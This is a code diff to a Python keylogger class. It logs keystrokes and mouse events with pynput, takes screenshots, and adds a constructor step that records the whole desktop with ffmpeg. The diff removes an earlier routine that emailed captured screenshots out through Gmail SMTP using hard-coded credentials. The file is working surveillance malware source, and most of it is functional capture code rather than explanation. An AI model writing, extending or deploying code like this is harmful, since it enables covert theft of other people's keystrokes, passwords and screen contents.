@@ -1,12 +1,8 @@
 import logging
 import os
-import smtplib
-from email.mime.multipart import MIMEMultipart
-from email.mime.text import MIMEText
-from email.mime.base import MIMEBase
-from email import encoders
-
 from datetime import datetime
+import subprocess
+import sys
 
 from pynput.keyboard import Listener
 from pynput.mouse import Listener as MouseListener
@@ -15,12 +11,11 @@ from pynput.keyboard import Key
 
 
 class KeyLogger:
-    def __init__(self, email_address, email_password):
-        self.email_address = email_address
-        self.email_password = email_password
+    def __init__(self):
         self.log_file = None
         self.setup_logger()
         self.dpi = 96
+        self.start_recording()
 
     def setup_logger(self):
         logging.basicConfig(filename='key_inputs.txt', level=logging.INFO,
@@ -64,43 +59,22 @@ class KeyLogger:
         keyboard_listener = Listener(on_press=self.on_press)
         mouse_listener = MouseListener(on_move=self.on_move, on_click=self.on_click, on_scroll=self.on_scroll)
 
+        keyboard_listener.daemon = True
+        mouse_listener.daemon = True
+
         keyboard_listener.start()
         mouse_listener.start()
 
-        # Wait for the threads to finish
-        keyboard_listener.join()
-        mouse_listener.join()
+        try:
+            # Keep the main thread alive to handle KeyboardInterrupt
+            while True:
+                pass
+        except KeyboardInterrupt:
+            # Handle KeyboardInterrupt (Ctrl+C) to stop the listeners
+            keyboard_listener.stop()
+            mouse_listener.stop()
+            sys.exit(0)  # Exit the program gracefully
 
-    def stop(self):
-        # Stop listeners and close the log file
-        Listener.stop()
-        MouseListener.stop()
-        if self.log_file:
-            self.log_file.close()
-
-    def send_email(self, subject, message, attachment_path=None):
-        msg = MIMEMultipart()
-        msg['From'] = self.email_address
-        msg['To'] = self.email_address
-        msg['Subject'] = subject
-
-        msg.attach(MIMEText(message, 'plain'))
-
-        if attachment_path:
-            attachment = open(attachment_path, "rb")
-            part = MIMEBase('application', 'octet-stream')
-            part.set_payload((attachment).read())
-            encoders.encode_base64(part)
-            part.add_header('Content-Disposition', "attachment; filename= %s" % os.path.basename(attachment_path))
-            msg.attach(part)
-
-        server = smtplib.SMTP('smtp.gmail.com', 587)
-        server.starttls()
-        server.login(self.email_address, self.email_password)
-        text = msg.as_string()
-        server.sendmail(self.email_address, self.email_address, text)
-        self.log.info("Screenshot sent")
-        server.quit()
 
     def take_screenshot(self):
         # Create directory if it doesn't exist
@@ -119,12 +93,28 @@ class KeyLogger:
         # Save screenshot to file
         screenshot.save(screenshot_path)
         self.log.info("Screenshot captured")
-        self.send_email("Screenshot Captured", "A screenshot has been captured.", screenshot_path)
+
+    def start_recording(self):
+        # Command to start recording using ffmpeg
+        command = [
+            'C:/ffmpeg/bin/ffmpeg.exe',  # Full path to ffmpeg executable
+            '-f', 'gdigrab',  # Input format (gdigrab for Windows)
+            '-framerate', '30',  # Frame rate
+            '-i', 'desktop',  # Input source (desktop captures the entire screen)
+            '-c:v', 'libx264',  # Video codec
+            '-preset', 'ultrafast',  # Preset for encoding speed (ultrafast for less CPU usage)
+            'output.mp4'  # Output file name
+        ]
+        # Start the recording process
+        recording_process = subprocess.Popen(command)
+
+        # Wait for the recording to finish (you can terminate it using recording_process.terminate())
+        recording_process.wait()
+        self.log.info("Screen recorded")
 
 
+# Example usage:
 if __name__ == "__main__":
-    keylogger = KeyLogger("dileebandileeban6@gmail.com", "1234")
-    try:
-        keylogger.start()
-    except KeyboardInterrupt:
-        keylogger.stop()
+    keylogger = KeyLogger()
+    keylogger.start()
+
